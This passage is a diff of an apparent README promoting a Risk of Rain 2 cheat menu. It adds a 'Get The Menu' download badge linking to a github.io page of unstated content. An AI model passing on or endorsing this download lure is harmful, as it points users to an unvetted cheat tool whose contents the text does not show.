@@ -4,7 +4,7 @@
 
 **Risk of Rain 2 (RoR2)** is all about surviving longer, farming harder, and scaling against endless waves of enemies. But sometimes the grind feels too punishing, which is why many players use a **Risk of Rain 2 cheat menu**. Unlike simple trainers, cheat menus provide a full in-game overlay packed with hacks like **god mode, item spawners, infinite gold, and XP boosts**. In this guide, we’ll explore what makes cheat menus powerful, their main features, and how they compare with other cheat tools.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Menu-blueviolet)](https://risk-of-rain-2-cheat-menu.github.io/.github/)
 ---
 
 ## What is a Risk of Rain 2 Cheat Menu?
